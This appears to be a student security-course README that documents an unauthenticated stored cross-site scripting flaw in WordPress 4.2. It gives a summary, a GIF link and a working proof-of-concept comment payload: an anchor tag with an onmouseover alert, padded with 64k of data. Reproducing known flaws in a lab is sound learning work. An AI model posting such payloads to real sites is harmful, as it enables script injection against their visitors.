# Week-7-Project
WordPress vs. Kali
> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

1.) WordPress version 4.2 : Unauthenticated XSS (Cross Site Scripting)
- [ ] Summary:
   - Type of vulnerability: Cross Site Scripting
   - Fixed in version 4.2.1
   - Tested in version 4.2
- [ ] GIF Walkthrough:![](https://i.imgur.com/9udE06b.gif)
- [ ] Steps to recreate: Use the following to comment on a WordPress Post: 
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px <insert 64k of random data
- [ ] Affected source code: N/A
